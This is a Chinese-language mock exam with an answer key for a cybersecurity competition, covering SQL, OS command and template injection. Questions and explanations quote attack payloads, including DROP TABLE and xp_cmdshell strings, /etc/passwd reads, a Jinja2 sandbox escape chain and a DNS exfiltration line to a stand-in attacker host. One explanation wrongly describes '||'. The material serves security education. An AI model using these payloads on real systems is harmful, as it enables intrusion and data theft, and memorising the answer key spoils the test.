# 🛡️ 金盾獎初賽專項全真模擬卷：單元一（Web 伺服器端核心注入）

> **考試科目**：隊員 A 核心主責 —— 單元一（SQL 注入全景 ＋ OS 命令注入 ＋ SSTI 模板注入）  
> **試卷規模**：25 道全真單選情境題（滿分 100 分，每題 4 分）  
> **建議作答時間**：20 ～ 25 分鐘（平均每題 50 秒，模擬初賽臨場作答節奏）  
> **合格門檻**：88 分（答對 22 題以上即達初賽「秒殺級」標準）  
> **配套手冊**：[`../web/R10.1`](../web/R10.1_sql_query_injection.md) ｜ [`../web/R10.2`](../web/R10.2_os_command_shell_injection.md) ｜ [`../web/R10.3`](../web/R10.3_server_side_template_injection.md)

---

## 📑 試題卷（請先作答，答案與解析位於文末）

### 第一部分：SQL 注入回顯與抽取機制（Q1 ~ Q5）

#### Q1. 【回顯與 UNION 限制】
某電子商城商品頁面 `item.php?id=10`，其後端查詢語法為 `SELECT id, name, desc, price FROM items WHERE id = $id`。攻擊者欲使用 UNION 注入抽取敏感資料，下列何者為攻擊成功必須滿足的先決條件？
* (A) 後端資料庫必須開放遠端 root 連線權限
* (B) 前端頁面必須將資料庫查出的欄位內容直接回顯渲染在網頁上，且 UNION 後的欄位數與資料型態需對齊
* (C) 目標伺服器必須配置寬鬆的 CORS 允許攜帶憑證
* (D) 目標伺服器必須支援堆疊查詢 (Stacked Queries)

#### Q2. 【Error-based 報錯注入】
當目標系統關閉了查詢結果的正常回顯，但未關閉資料庫詳細錯誤提示。攻擊者在參數輸入 `' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- `，其核心攻擊機制為何？
* (A) 利用 XML 格式不符觸發 XPATH 解析異常，使資料庫在報錯字串中強行吐出查詢結果
* (B) 利用 XML 外部實體宣告達成 SSRF 內網探測
* (C) 透過 updatexml 函數覆寫資料庫核心權限表
* (D) 觸發資料庫緩衝區溢位造成資料庫崩潰重啟

#### Q3. 【Boolean-based 布林盲注】
某系統之查詢端點 `check_user.php?user=admin`，在使用者存在時回傳 `HTTP 200 "User Exists"`，在不存在時回傳 `HTTP 200 "User Not Found"`，且不噴出任何資料庫報錯。若攻擊者欲利用二分搜尋法逐字元萃取資料庫名稱，平均每個字元需發送約幾次 HTTP 請求？
* (A) 1 次
* (B) 7 次
* (C) 64 次
* (D) 128 次

#### Q4. 【Time-based 時間盲注】
在完全無回顯、無報錯、且無論輸入為何網頁 HTTP 回應內容與長度完全一致的情境下，攻擊者使用時間盲注。若後端使用 MySQL，下列何者為標準的時間延遲驗證語法？
* (A) `' OR IF(1=1, pg_sleep(5), 0)-- `
* (B) `'; WAITFOR DELAY '0:0:5'-- `
* (C) `' OR IF(1=1, SLEEP(5), 0)-- `
* (D) `' AND dbms_pipe.receive_message('RDS', 5)-- `

#### Q5. 【Out-of-band 帶外資料外洩】
在嚴格無回顯且時間盲注因網路抖動極不穩定的環境中，攻擊者使用 Out-of-band (OOB) 技術。下列何者最符合 OOB 外帶資料的運作機制？
* (A) 強迫資料庫伺服器向外部惡意 DNS 伺服器發起域名解析，並將敏感資料拼接於子網域名稱中
* (B) 在前端網頁注入 `<script>` 標籤將資料以 POST 外發至攻擊機
* (C) 修改 HTTP Request Header 中的 `X-Forwarded-For` 將回應重導向
* (D) 強迫後端向本機 `127.0.0.1:80` 發起 HTTP 請求

---

### 第二部分：語法邊界、編碼與寬字節（Q6 ~ Q8）

#### Q6. 【整數型注入 (Numeric Context)】
後端程式碼如下：
```php
$id = $_GET['id'];
$id = str_replace("'", "", $id); // 嚴格過濾單引號
$res = mysqli_query($conn, "SELECT * FROM news WHERE id = " . $id);
```
針對此程式碼，攻擊者輸入 `id=1 OR 1=1` 依然能成功拖庫，其根本原因為何？
* (A) `mysqli_query` 預設具備自動解碼特性
* (B) 該注入點處於整數型情境，SQL 語法本身即無須任何單引號閉合即可形成合法表達式
* (C) 單引號過濾被 HTML 實體編碼繞過
* (D) 伺服器端觸發了緩衝區溢位

#### Q7. 【字串型注入與註解截斷】
後端查詢為 `SELECT * FROM users WHERE username = '$user' AND status = 1`。攻擊者欲繞過後方的 `AND status = 1` 條件，下列哪一個 Payload 能在 MySQL 中成功閉合字串並註解掉後方語句？
* (A) `admin' OR 1=1#`
* (B) `admin' OR 1=1--`（註：`--` 後方無空格）
* (C) `admin" OR 1=1//`
* (D) `admin' OR 1=1;`

#### Q8. 【寬字節注入 (Wide-Byte)】
某 PHP 舊系統啟用了 `magic_quotes_gpc`（或調用 `addslashes`），對所有單引號 `'` 自動轉義為 `\'`，且資料庫連線編碼採用 **GBK**。攻擊者傳入 `%df'` 成功逃逸單引號，其底層物理原因是？
* (A) `%df` 觸發了 PHP 直譯器的記憶體洩漏
* (B) `%df` (`0xDF`) 與轉義斜線 `\` (`0x5C`) 在 GBK 雙位元組編碼下被合併解碼為漢字「運」，使後方單引號脫穎而出
* (C) `%df` 在 ASCII 碼中等價於單引號
* (D) GBK 編碼強制忽略所有反斜線字元

---

### 第三部分：高頻架構與進階題型（Q9 ~ Q11）

#### Q9. 【`ORDER BY` 注入之防禦盲點】
工程師開發商品排序功能 `SELECT * FROM items ORDER BY $sort_column $sort_order`，發現使用預編譯 (PreparedStatement) 的參數占位符 `?` 時系統直接拋出語法異常。關於此現象，下列敘述何者正確？
* (A) 這是該資料庫驅動的 Bug，重啟服務即可解決
* (B) SQL 標準規定欄位名稱、資料表名稱與排序關鍵字不可作為參數占位符，此類情境必須使用伺服器端白名單映射 (Whitelist) 防禦
* (C) 預編譯僅適用於數字型欄位，字串型欄位皆無法使用
* (D) 解決方式是改用前端 JavaScript 過濾特殊符號

#### Q10. 【二階 SQL 注入 (Second-Order)】
關於「二階 SQL 注入 (Second-Order SQLi)」的生命週期與行為特徵，下列描述何者正確？
* (A) 攻擊者發送惡意請求後，伺服器發起二級 DNS 查詢解析外帶資料
* (B) 惡意 Payload 在初次輸入存入資料庫時未觸發危害（可能已經過轉義），待後續其他業務邏輯自資料庫撈出該資料二次拼接至全新 SQL 語句時才正式引爆
* (C) 攻擊者連續發送兩次完全相同的 HTTP 請求造成競爭條件
* (D) 必須依賴資料庫管理員帳號 (DBA) 權限才能觸發

#### Q11. 【堆疊查詢 (Stacked Queries)】
下列哪一種資料庫環境在預設組態下，最常支援透過分號 `;` 連鎖執行完全獨立的全新語句（例如 `; DROP TABLE users;--` 或調用 `xp_cmdshell`）？
* (A) PHP 搭配 MySQL 的標準 `mysqli_query()` 呼叫
* (B) Microsoft SQL Server (MSSQL)
* (C) 預設配置的 SQLite3
* (D) Oracle Database

---

### 第四部分：四大資料庫指紋與特性（Q12 ~ Q15）

#### Q12. 【資料庫指紋與字串連接】
若攻擊者在黑箱注入測試中，輸入 `' UNION SELECT 'a' + 'b', NULL-- ` 回傳字串 `ab`，但若使用 `'a' || 'b'` 則回傳錯誤，則目標後端資料庫最可能為？
* (A) PostgreSQL
* (B) Oracle
* (C) Microsoft SQL Server (MSSQL)
* (D) MySQL

#### Q13. 【延遲函數廠牌對照】
資安分析師在防火牆 (WAF) 攔截日誌中看見以下攻擊 Payload：  
`?id=100 AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('RDS', 5) ELSE 1 END FROM DUAL)--`  
該攻擊者正在針對何種資料庫管理系統進行盲注測試？
* (A) MySQL
* (B) PostgreSQL
* (C) Oracle Database
* (D) IBM DB2

#### Q14. 【PostgreSQL 特色延遲函數】
在針對 PostgreSQL 進行時間盲注時，攻擊者最常調用的內建延遲函數為？
* (A) `SLEEP(5)`
* (B) `WAITFOR DELAY '0:0:5'`
* (C) `pg_sleep(5)`
* (D) `sys_sleep(5)`

#### Q15. 【MySQL 專屬註解與指紋】
在 MySQL 中，下列哪一種語法為 MySQL 專屬的條件註解（當 MySQL 版本大於等於 5.0 時會執行其中的語句，其他資料庫則視為普通註解忽略）？
* (A) `/*#50000 SELECT 1 */`
* (B) `/*!50000 SELECT 1 */`
* (C) `--#50000 SELECT 1`
* (D) `//50000 SELECT 1`

---

### 第五部分：防禦邊界與 WAF 繞過（Q16 ~ Q18）

#### Q16. 【空白符過濾繞過】
當目標系統之 Web 應用防火牆 (WAF) 嚴格阻擋了 URL 與請求內容中的空白鍵（Space 與 `%20`），攻擊者在 SQL 注入中最常使用下列何種語法替代空白？
* (A) `/**/` 行內註解符號或換行符 `%0a`
* (B) 雙引號 `""`
* (C) 反斜線 `\`
* (D) 百分比符號 `%`

#### Q17. 【關鍵字過濾繞過】
某後端程式採用黑名單過濾：`$input = str_ireplace("SELECT", "", $input);`（只替換一次且不分大小寫）。攻擊者使用下列何種構造能成功繞過並維持 `SELECT` 關鍵字？
* (A) `SeLeCt`
* (B) `SELSELECTECT`（雙寫嵌套）
* (C) `SELECT`
* (D) `%73%65%6c%65%63%74`

#### Q18. 【SQL 注入之根本防禦】
關於 SQL 注入之防禦措施，下列何者敘述完全正確？
* (A) 部署 WAF 並定期更新規則即可 100% 根除 SQL 注入
* (B) 將輸入之特殊字元（如 `'`, `"`, `;`）以黑名單方式全部剔除即可杜絕
* (C) 全面採用參數化查詢 (Prepared Statements) 預編譯語法，使資料庫引擎將輸入參數嚴格視為數值 (Literal) 而非語法結構
* (D) 將資料庫連線帳號密碼改為 32 碼複雜密碼即可防止注入

---

### 第六部分：OS 命令注入 (Command Injection)（Q19 ~ Q22）

#### Q19. 【命令注入連鎖符號】
某網管功能呼叫後端 `ping -c 3 [IP]`。攻擊者在參數輸入 `127.0.0.1; whoami`，其能成功執行 `whoami` 的原因為何？
* (A) 分號 `;` 在 Shell 語法中為命令終止與順序執行符號
* (B) 分號 `;` 會使 ping 指令觸發例外終止
* (C) whoami 會被當作 ping 指令的子參數解析
* (D) 這是作業系統未啟用 DEP 導致的記憶體覆寫

#### Q20. 【命令注入空格過濾繞過】
在 Linux 環境之命令注入中，若後端檢驗並剔除了空格字元，攻擊者欲執行 `cat /etc/passwd`，下列何種 Payload **無法** 達成繞過效果？
* (A) `cat${IFS}/etc/passwd`
* (B) `cat$IFS$9/etc/passwd`
* (C) `cat</etc/passwd`
* (D) `cat\0/etc/passwd`

#### Q21. 【命令注入邏輯運算元】
若攻擊者輸入 `nonexistent_command && whoami`，在 Linux Bash 環境下，`whoami` 是否會被執行？
* (A) 會，`&&` 代表無論前指令成功與否皆強制並行執行
* (B) 不會，`&&` 具有短路特性，僅在前一指令回傳值為 0 (執行成功) 時才會執行後續指令
* (C) 會，`&&` 會自動忽略前一指令的錯誤
* (D) 不會，因為包含特殊字元直接被核心拋棄

#### Q22. 【無回顯命令盲注】
某路由器的重開機端點存在命令注入，但頁面完全不輸出任何結果或錯誤。若攻擊者欲確認該命令注入是否存在，下列何者為最常見的驗證手法？
* (A) 注入 `sleep 5` 並比對 HTTP 回應延遲時間
* (B) 注入 `echo 1` 並查看 HTTP Status Code
* (C) 注入 `exit 0`
* (D) 注入 `whoami`

---

### 第七部分：SSTI 模板注入 (Server-Side Template Injection)（Q23 ~ Q25）

#### Q23. 【SSTI 語法辨識決策】
在 SSTI 漏洞黑箱探測中，攻擊者在輸入框輸入 `${7*7}` 頁面顯示 `${7*7}`（未解析），但輸入 `{{7*7}}` 時頁面顯示 `49`。此時攻擊者進一步輸入 `{{7*'7'}}`，頁面回顯為 `7777777`。據此特徵，目標後端使用的模板引擎最可能為？
* (A) Twig (PHP)
* (B) Jinja2 (Python)
* (C) Smarty (PHP)
* (D) FreeMarker (Java)

#### Q24. 【Python Jinja2 沙盒逃逸】
在 Python Flask / Jinja2 的 SSTI 沙盒逃逸中，攻擊者經常利用 `"".__class__.__mro__[1].__subclasses__()`，其背後核心原理為何？
* (A) 遍歷 Python 記憶體中的全域變數尋找 flag
* (B) 透過空字串獲取 `str` 類別，循 Method Resolution Order (MRO) 爬升至基底類別 `object`，再列舉出記憶體中已載入的所有子類別以尋找 `os._wrap_close` 等具備執行系統命令能力的 Gadget
* (C) 竄改 Jinja2 的語法解析器使其進入除錯模式
* (D) 觸發 Python 直譯器的型態轉換例外

#### Q25. 【SSTI 之根本成因】
SSTI (伺服器端模板注入) 產生的本質原因為何？
* (A) 開發者直接將未經檢驗的使用者輸入拼裝至「模板字串」中，而非將輸入作為變數「傳遞 (Render Context)」給模板引擎渲染
* (B) 伺服器使用了過時版本的 HTTP 協定
* (C) 模板編譯器未開啟 JIT 加速
* (D) 前端未配置 Strict-Transport-Security (HSTS)

---

## 🔑 解答與逐題深度剖析（對卷檢討）

| 題號 | 標準答案 | 核心題眼（5 秒反射） | 關鍵考點與誘答陷阱解析 |
| :---: | :---: | :--- | :--- |
| **Q1** | **(B)** | 回顯輸出 ＋ 欄位型態對齊 | (B) 為唯一正解。UNION 必須將資料追加於原始查詢的回顯區塊，無回顯則無法使用 UNION；(A) 非必要；(C) CORS 屬前端同源跨域，與資料庫回顯無關；(D) 堆疊查詢為分號執行多語句，非 UNION 前提。 |
| **Q2** | **(A)** | `updatexml` 報錯夾帶資料 | (A) 為標準定義。`updatexml(1, concat(...), 1)` 第二個參數預期為合法的 XPATH 語法，傳入以 `~` 開頭的字串會觸發格式錯誤，資料庫在拋出錯誤字串時將中間的查詢結果一起印出。 |
| **Q3** | **(B)** | 二分搜尋法 7 次 | (B) 必背。一個標準 ASCII 字元範圍為 0~127（共 128 種可能），以二分搜尋法猜測（例如 $2^7 = 128$），每次縮小一半範圍，平均僅需 7 次請求即可鎖定單一字元。 |
| **Q4** | **(C)** | MySQL 延遲函數 `sleep(5)` | (C) 正確。`pg_sleep` 為 PostgreSQL；`WAITFOR DELAY` 為 MSSQL；`dbms_pipe` 為 Oracle。初賽看到 `sleep` 秒認 MySQL。 |
| **Q5** | **(A)** | DNS 請求子網域夾帶 | (A) 正確。Out-of-band (OOB) 利用資料庫的特定函數（如 MySQL `load_file('\\\\password.attacker.com\\a')`）觸發本機向外查詢 DNS，攻擊者監聽自己的權威 DNS 伺服器日誌即可看到解析紀錄。 |
| **Q6** | **(B)** | 整數型注入無須引號 | (B) 正確。後端語法為 `WHERE id = $id`，傳入 `1 OR 1=1` 直接形成 `WHERE id = 1 OR 1=1`，整條 SQL 完全不需要引號閉合即合法。工程師以為「防單引號即防注入」是實務最常見漏洞。 |
| **Q7** | **(A)** | MySQL 註解 `#` | (A) 正確。MySQL 的 `#` 可直接單字元註解；(B) 錯誤，MySQL 要求 `--` 之後**必須接一個空格**（`-- `）才被視為註解；(C) `//` 不是 SQL 註解；(D) 分號只是語句終止，後面語句仍會解析報錯。 |
| **Q8** | **(B)** | GBK 雙位元組吃掉反斜線 | (B) 正確。`%df` 遇到轉義斜線 `\` (`%5c`)，合體組裝成漢字「運」(`%df%5c`)，單引號 `'` (`%27`) 逃逸。這是雙字節編碼特性的經典物理考題。 |
| **Q9** | **(B)** | ORDER BY 無法參數化 | (B) 正確。PreparedStatement 只允許將數值或字串常數作為 `?`，不允許欄位名或關鍵字占位。因此 `ORDER BY` 注入必須仰賴後端建立嚴格的「白名單映射 (Whitelist)」防禦。 |
| **Q10** | **(B)** | 儲存潛伏，二次讀取引爆 | (B) 正確。二階注入初次儲存經過清理或轉義，安全無害；待另一模組讀出該資料直接拼接至新 SQL 時才觸發。題目看到「安全儲存、後續業務撈出」秒選二階。 |
| **Q11** | **(B)** | MSSQL 支援堆疊查詢 | (B) 正確。MSSQL 預設完全支援 `;` 連鎖執行（常搭配 `xp_cmdshell` 拿 RCE）；PHP 呼叫 MySQL 標準 `mysqli_query` 時不允許執行多條語句。 |
| **Q12** | **(C)** | MSSQL 字串連接用 `+` | (C) 正確。MSSQL 使用 `+` 連接字串；Oracle 與 PostgreSQL 使用 `||`；MySQL 使用 `CONCAT()` 函式。看到 `+` 連接字串秒選 MSSQL。 |
| **Q13** | **(C)** | `dbms_pipe` 為 Oracle | (C) 正確。看到 `dbms_pipe.receive_message` 或結尾的 `FROM DUAL`，100% 為 Oracle 專屬語法。 |
| **Q14** | **(C)** | `pg_sleep(5)` 為 PostgreSQL | (C) 正確。函數名稱前綴自帶 `pg_`，初賽看到秒選 PostgreSQL。 |
| **Q15** | **(B)** | `/*!50000 ... */` 條件註解 | (B) 正確。MySQL 專屬條件註釋格式為 `/*!版本號 SQL */`，例如 `/*!50000 SELECT 1*/`，在 MySQL 5.0+ 會被執行，在其他資料庫中則被視為一般多行註解直接忽略。 |
| **Q16** | **(A)** | `/**/` 行內註解替代空格 | (A) 正確。SQL 語法允許在關鍵字之間插入行內註解，例如 `SELECT/**/password/**/FROM/**/users`，常被用來繞過 WAF 的空白字元過濾。 |
| **Q17** | **(B)** | 雙寫嵌套繞過單次替換 | (B) 正確。若後端只執行一次 `str_ireplace` 剔除 `SELECT`，構造 `SELSELECTECT` 時，中間的 `SELECT` 被抽掉後，兩側的 `SEL` 與 `ECT` 會自動拼接還原為 `SELECT`。 |
| **Q18** | **(C)** | 參數化查詢 (Prepared Statements) | (C) 正確。唯有參數化查詢能從語意上將輸入嚴格劃歸為常數數值，杜絕 AST 語法樹邊界被破壞。(A)(B) 黑名單與 WAF 均可被繞過；(D) 連線密碼與 SQLi 成因無關。 |
| **Q19** | **(A)** | 分號 `;` 命令終止與順序執行 | (A) 正確。在 Linux/Unix Shell 中，分號 `;` 代表前一條指令結束，緊接著執行下一條指令。 |
| **Q20** | **(D)** | `\0` 空字元無法替代空格 | (D) 錯誤，無法達成繞過效果。在 Linux Bash 中，`${IFS}`（內部欄位分隔符號，預設包含空格）、`$IFS$9`（`$9` 為空變數）、以及輸入重新導向 `<`（如 `cat</etc/passwd`）皆可成功替代空格。 |
| **Q21** | **(B)** | `&&` 具備短路特性 | (B) 正確。`&&` 為邏輯 AND，只有在前一條指令執行成功（Exit Code 0）時才會執行後者；若前指令失敗（如 `nonexistent_command`），後者直接被跳過。若要無論成功失敗皆執行，應使用 `;` 或 `||`。 |
| **Q22** | **(A)** | 注入延遲比對時間 | (A) 正確。無回顯命令盲注首選 `sleep 5`（或對外 ping / DNS 外帶），藉由網路請求耗時是否精準增加 5 秒來判定命令是否被執行。 |
| **Q23** | **(B)** | `{{7*'7'}}` 輸出 `7777777` ➔ Jinja2 | (B) 正確。Jinja2 (Python) 中字串乘法 `'7'*7` 會重複字串產出 `7777777`；Twig (PHP) 則會將字串隱式轉型為整數進行乘法運算產出 `49`。此為初賽 SSTI 引擎區分經典考題。 |
| **Q24** | **(B)** | `__mro__` 爬升至 `object` 尋找子類別 | (B) 正確。Python 所有物件皆繼承自 `object`。透過 `__mro__` 爬至最頂層基底類別後，透過 `__subclasses__()` 列舉記憶體中全部已載入之 Class，進而獲取如 `subprocess.Popen` 或 `os._wrap_close` 達成 RCE。 |
| **Q25** | **(A)** | 未作變數分離，直接拼接模板字串 | (A) 正確。SSTI 的根本病因是開發者將使用者輸入直接用字串拼接塞進模板中編譯，導致使用者輸入被當作模板語法解析執行；正確做法是透過 `render_template("page.html", user_input=val)` 作為變數傳遞。 |
